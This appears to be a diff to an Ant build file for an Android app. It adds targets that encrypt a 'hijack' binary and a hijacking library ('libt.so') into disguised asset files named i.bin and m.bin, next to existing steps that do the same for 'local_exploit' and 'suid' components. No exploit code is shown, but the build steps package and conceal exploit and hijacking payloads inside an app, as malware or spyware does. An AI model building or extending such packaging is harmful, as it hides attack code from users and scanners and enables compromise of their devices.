@@ -117,8 +117,18 @@
 		<delete file="assets/l.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/local_exploit" outputFile="assets/l.bin" />
 	</target>
+	
+	<target name="encrypt-hijacklibrary">
+		<delete file="assets/i.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt.so" outputFile="assets/i.bin" />
+	</target>
+	
+	<target name="encrypt-hijacker">
+		<delete file="assets/m.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/hijack" outputFile="assets/m.bin" />
+	</target>
 
-	<target name="libs" depends="encrypt-suid, encrypt-exploitcheck, encrypt-localexploit">
+	<target name="libs" depends="encrypt-suid, encrypt-exploitcheck, encrypt-localexploit, encrypt-hijacklibrary, encrypt-hijacker">
 	</target>
 
 
